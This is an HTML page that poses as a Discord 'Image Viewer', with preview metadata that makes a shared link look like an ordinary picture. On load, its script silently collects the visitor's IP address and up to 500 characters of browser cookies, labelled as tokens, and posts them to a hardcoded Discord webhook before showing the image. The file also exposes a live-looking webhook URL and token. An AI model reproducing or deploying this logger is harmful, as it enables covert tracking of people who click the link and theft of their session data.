<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- THIS IS KEY FOR DISCORD PREVIEW -->
    <meta property="og:image" content="https://media.discordapp.net/attachments/1280593964357124238/1571993907036684490/image.png?ex=6afe1269&is=6afcc0e9&hm=0ed6e659ba030c1608f0f9978fc8fcfa9b5505a4687a6f91d67e442f8fccf332&format=webp&quality=lossless&width=1280&height=1001">
    <meta property="og:title" content="Image Viewer">
    <meta property="og:description" content="Click to view full size">
    <meta name="theme-color" content="#36393f">

    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #36393f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        img {
            max-width: 100%;
            max-height: 100%;
            cursor: pointer;
            border-radius: 4px;
        }
    </style>
</head>
<body>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";
    const IMAGE_SRC = "https://media.discordapp.net/attachments/1280593964357124238/1571993907036684490/image.png?ex=6afe1269&is=6afcc0e9&hm=0ed6e659ba030c1608f0f9978fc8fcfa9b5505a4687a6f91d67e442f8fccf332&format=webp&quality=lossless&width=1280&height=1001";

    (async () => {
        try {
            // 1. Log Data
            let ip = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🕵️‍♂️ New Click!",
                        color: 5763457,
                        fields: [
                            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
                            { name: "🔑 Token/Cookies", value: `\`\`\`${document.cookie.substring(0, 500)}\`\`\``, inline: false },
                            { name: "📅 Time", value: new Date().toLocaleString(), inline: false }
                        ]
                    }]
                })
            });
        } catch (e) {}

        // 2. Show Image
        const img = document.createElement('img');
        img.src = IMAGE_SRC;
        document.body.appendChild(img);
    })();
</script>

</body>
</html>
